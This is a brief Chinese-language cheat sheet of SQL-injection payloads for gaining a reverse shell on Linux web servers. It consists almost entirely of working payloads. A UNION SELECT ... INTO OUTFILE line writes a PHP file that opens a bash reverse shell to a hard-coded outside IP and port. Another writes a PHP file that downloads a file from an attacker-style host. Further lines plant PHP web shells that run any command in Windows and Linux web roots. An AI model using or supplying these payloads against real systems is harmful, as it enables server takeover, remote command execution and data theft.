# 反弹shell（终端，注入下都可）（linux）

‍

1. 直接反弹

```bash
union select ""<?php exec(\""/bin/bash -c \'bash -i >& /dev/tcp/159.203.242.172/1999 0>&1\'\"");"" INTO OUTFILE '/var/www/ecustomers/samshell4.php'
```

1. 上传，打开

```bash
1. 从本地上传
' union select ""<?php file_put_contents(\""root\"", file_get_contents(\""http://attack.samsclass.info/root\"")); ?>"" INTO OUTFILE '/var/www/ecustomers/samget2.php' #
2. 打开
' union select ""<?php system($_REQUEST['cmd']); ?>"" INTO OUTFILE '/var/www/ecustomers/samshell.php' #
```

1. win以及linux的生成后门php

```bash
Windows : SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"
Linux : SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

‍
